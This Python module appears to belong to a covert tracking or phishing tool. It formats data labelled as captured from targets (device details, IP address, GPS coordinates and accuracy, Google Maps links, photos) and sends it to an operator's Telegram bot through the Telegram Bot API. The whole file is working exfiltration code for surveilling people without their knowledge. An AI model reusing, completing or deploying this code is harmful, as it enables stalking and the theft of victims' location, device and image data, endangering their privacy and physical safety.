#!/usr/bin/env python3
import json
import requests
from datetime import datetime


def tgram_sender(msg_type, content, tmpsplit):
    bot_token = f'{tmpsplit[0]}:{tmpsplit[1]}'
    chat_id = tmpsplit[2]
    api_url = f'https://api.telegram.org/bot{bot_token}/sendMessage'

    if msg_type == 'device_info':
        text = (
            f'*Device Information Captured*\n'
            f'`OS       :` {content.get("os", "N/A")}\n'
            f'`Platform :` {content.get("platform", "N/A")}\n'
            f'`CPU Cores:` {content.get("cores", "N/A")}\n'
            f'`RAM      :` {content.get("ram", "N/A")}\n'
            f'`GPU      :` {content.get("vendor", "N/A")} / {content.get("render", "N/A")}\n'
            f'`Browser  :` {content.get("browser", "N/A")}\n'
            f'`IP       :` {content.get("ip", "N/A")}\n'
            f'`Session  :` {content.get("sid", "N/A")}\n'
        )

    elif msg_type == 'location':
        text = (
            f'*GPS Location Captured*\n'
            f'`Latitude :` {content.get("lat", "N/A")}\n'
            f'`Longitude:` {content.get("lon", "N/A")}\n'
            f'`Accuracy :` {content.get("acc", "N/A")}\n'
            f'`Altitude :` {content.get("alt", "N/A")}\n'
            f'`Speed    :` {content.get("spd", "N/A")}\n'
            f'`Session  :` {content.get("sid", "N/A")}\n'
        )

    elif msg_type == 'url':
        text = (
            f'*Google Maps Link*\n'
            f'{content.get("url", "N/A")}\n'
            f'`Session:` {content.get("sid", "N/A")}'
        )

    elif msg_type == 'error':
        text = (
            f'*Location Error*\n'
            f'`Error   :` {content.get("error", "Unknown")}\n'
            f'`Session :` {content.get("sid", "N/A")}'
        )

    else:
        text = f'*{msg_type}*\n```json\n{json.dumps(content, indent=2)}\n```'

    try:
        resp = requests.post(api_url, json={
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'Markdown',
        }, timeout=10)
        if resp.status_code != 200:
            try:
                err_data = resp.json()
                desc = err_data.get('description', str(resp.status_code))
            except Exception:
                desc = resp.text[:200]
            print(f'\033[31m[-] Telegram API error: {desc}\033[0m')
    except Exception as e:
        print(f'\033[31m[-] Telegram request failed: {e}\033[0m')


def tgram_photo_sender(photo_path, caption, tmpsplit):
    bot_token = f'{tmpsplit[0]}:{tmpsplit[1]}'
    chat_id = tmpsplit[2]
    api_url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

    import os as _os
    if not _os.path.exists(photo_path):
        print(f'\033[33m[!] File foto tidak ditemukan: {photo_path}\033[0m')
        return

    try:
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
            resp = requests.post(api_url, files=files, data=data, timeout=15)
        if resp.status_code != 200:
            try:
                err_data = resp.json()
                desc = err_data.get('description', str(resp.status_code))
            except Exception:
                desc = resp.text[:200]
            print(f'\033[31m[-] Telegram sendPhoto error: {desc}\033[0m')
    except Exception as e:
        print(f'\033[31m[-] Telegram sendPhoto failed: {e}\033[0m')
